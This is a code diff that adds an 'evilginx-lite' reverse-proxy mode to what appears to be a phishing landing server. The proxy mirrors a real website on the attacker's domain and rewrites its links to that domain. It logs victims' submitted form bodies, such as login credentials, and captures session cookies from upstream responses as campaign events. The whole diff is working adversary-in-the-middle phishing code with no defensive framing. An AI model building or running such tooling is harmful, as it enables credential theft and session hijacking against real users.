@@ -133,6 +133,7 @@ class LandingServer:
         base_url: str = "",
         default_kind: str = "",
         filter_scanners: bool = False,
+        upstream: str = "",
     ) -> None:
         from aiohttp import web
 
@@ -146,6 +147,12 @@ class LandingServer:
         self._runner: Any = None
         self._site: Any = None
         self._wide_bind_warned = False
+        self._upstream: tuple[str, str] | None = None
+        if upstream:
+            parts = urlsplit(upstream if "://" in upstream else f"https://{upstream}")
+            if parts.scheme not in ("http", "https") or not parts.hostname:
+                raise ValueError(f"bad --upstream URL: {upstream!r}")
+            self._upstream = (parts.scheme, parts.netloc)
 
     # ─── url builders ───
     def _loopback(self) -> bool:
@@ -474,7 +481,109 @@ class LandingServer:
         app.router.add_get("/oauth/cf", self.oauth)
         app.router.add_post("/ext/ingest", self.ext_ingest)
         app.router.add_post("/api/v1/results", self.results)
+        if self._upstream:
+            # evilginx-style catch-all: fixed routes win, everything else
+            # rides the reverse proxy
+            app.router.add_route("*", "/{path:.*}", self.proxy_everything)
         return app
+
+    # ─── evilginx-lite reverse proxy ───
+    # serves the real site's skin on our origin and logs what the victim
+    # submits upstream. captures land as campaign-less events; the funnel
+    # routes (/l, /s, /t, /hit) stay authoritative before this catch-all.
+    _PROXY_DROP_REQ = frozenset(
+        ("host", "connection", "keep-alive", "transfer-encoding", "upgrade")
+    )
+    _PROXY_DROP_RESP = frozenset(
+        ("connection", "keep-alive", "transfer-encoding", "content-length",
+         "content-encoding")
+    )
+    _PROXY_BODY_CAP = 1 << 21  # 2 MiB of upstream body per response
+
+    def _proxy_rewrite(self, html: str, up_host: str, victim_base: str) -> str:
+        """Point site-absolute references back at our origin — scheme-less
+        '//host' covers both 'https://host' and 'http://host' at once."""
+        return html.replace(f"//{up_host}", f"//{victim_base}")
+
+    async def proxy_everything(self, request: Any) -> Any:
+        from .http import get_client
+
+        scheme, netloc = self._upstream or ("https", "")
+        up_url = f"{scheme}://{netloc}{request.rel_url}"
+        fwd: dict[str, str] = {
+            k: v
+            for k, v in request.headers.items()
+            if k.lower() not in self._PROXY_DROP_REQ
+        }
+        fwd["Host"] = netloc
+        fwd["X-Forwarded-For"] = request.remote or ""
+        data = await request.read() if request.method in ("POST", "PUT") else None
+        if data and request.method == "POST" and request.remote:
+            await self._store(
+                self.store.log_event,
+                "",
+                "",
+                "proxy:form",
+                json.dumps(
+                    {
+                        "path": str(request.rel_url),
+                        "body": data.decode("utf-8", "replace")[:1500],
+                        "ip": request.remote,
+                    },
+                    ensure_ascii=False,
+                )[:1600],
+            )
+        client = get_client()
+        try:
+            sess = await client.session()
+            timeout = getattr(client, "_timeout", None)
+            kwargs: dict[str, Any] = {"headers": fwd}
+            if data is not None:
+                kwargs["data"] = data
+            if timeout is not None:
+                kwargs["timeout"] = timeout
+            probe = await sess.request(request.method, up_url, **kwargs)
+            async with probe as resp:
+                body = await resp.content.read(self._PROXY_BODY_CAP)
+                resp_headers = {
+                    k: v
+                    for k, v in resp.headers.items()
+                    if k.lower() not in self._PROXY_DROP_RESP
+                }
+                ctype = resp.content_type or ""
+                if ctype in ("text/html", "application/xhtml+xml") and body:
+                    victim = urlsplit(self.base(request))
+                    html = self._proxy_rewrite(
+                        body.decode("utf-8", "replace"),
+                        urlsplit(netloc).hostname or netloc,
+                        victim.netloc,
+                    )
+                    body = html.encode("utf-8")
+                if resp.cookies:
+                    await self._store(
+                        self.store.log_event,
+                        "",
+                        "",
+                        "proxy:cookie",
+                        json.dumps(
+                            {
+                                "host": netloc,
+                                "cookies": {
+                                    k: morsel.value[:200]
+                                    for k, morsel in resp.cookies.items()
+                                },
+                            },
+                            ensure_ascii=False,
+                        )[:1600],
+                    )
+                return self.web.Response(
+                    status=resp.status,
+                    body=body,
+                    headers=resp_headers,
+                )
+        except Exception as exc:  # noqa: BLE001
+            LOG.warning("proxy fail: %s", exc)
+            return self.web.Response(status=502, text="upstream error")
 
     async def start(
         self,
